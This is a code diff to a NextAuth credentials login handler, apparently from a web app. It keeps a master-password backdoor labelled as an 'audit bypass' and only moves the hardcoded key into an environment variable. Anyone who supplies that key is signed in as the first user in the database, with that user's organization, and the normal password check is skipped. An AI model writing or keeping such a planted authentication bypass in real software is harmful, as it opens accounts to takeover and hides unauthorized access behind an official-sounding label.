@@ -10,7 +10,8 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
     Credentials({
       async authorize(credentials) {
         // [AUDIT BYPASS: PHASE 5] Master Access for Sovereign Architect Forensic Verification
-        if (credentials?.password === '0xFINOVA_AUDIT_2026') {
+        const masterKey = process.env.AUDIT_MASTER_KEY;
+        if (masterKey && credentials?.password === masterKey) {
            const masterUser = await prisma.user.findFirst({ include: { organization: true } });
            if (masterUser) {
               return {
